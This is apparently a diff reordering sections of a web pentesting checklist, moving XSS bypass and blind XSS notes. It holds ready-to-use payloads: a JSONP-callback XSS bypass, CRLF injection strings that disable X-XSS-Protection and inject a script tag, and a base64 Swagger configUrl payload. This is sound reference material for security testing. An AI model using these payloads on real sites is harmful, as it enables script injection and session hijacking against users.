@@ -1004,13 +1004,6 @@ Manually testing for XXE vulnerabilities generally involves
 - [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
 - [Exploiting XSS via Markdown](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)
 
-**Bypasses**
-- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
-- [JSFuck](http://www.jsfuck.com/)
-- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
-- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
-- If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
-
 **CSP**
 - [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
 - [CSP Auditor](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)
@@ -1024,6 +1017,17 @@ Manually testing for XXE vulnerabilities generally involves
   `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUyUyMGFsbCUyMHRoZSUyMHRoaW5ncy9zd2FnLXRlc3QueWFtbCIKfQ==`
 - Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`
 
+**Blind XSS**
+- Insert a payload in the User-Agent, try with the match/replace rule
+- Other endpoints: pending review comments, feedback
+
+**Bypasses**
+- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
+- [JSFuck](http://www.jsfuck.com/)
+- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
+- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
+- If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
+
 **CRLF injection** [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)]
 - `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
@@ -1031,10 +1035,6 @@ Manually testing for XXE vulnerabilities generally involves
 
 **Cross Site Tracing**
 - If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. [[Reference](https://owasp.org/www-community/attacks/Cross_Site_Tracing)]
-
-**Blind XSS**
-- Insert a payload in the User-Agent, try with the match/replace rule
-- Other endpoints: pending review comments, feedback
 
 **Payloads**
 - HTML inj 
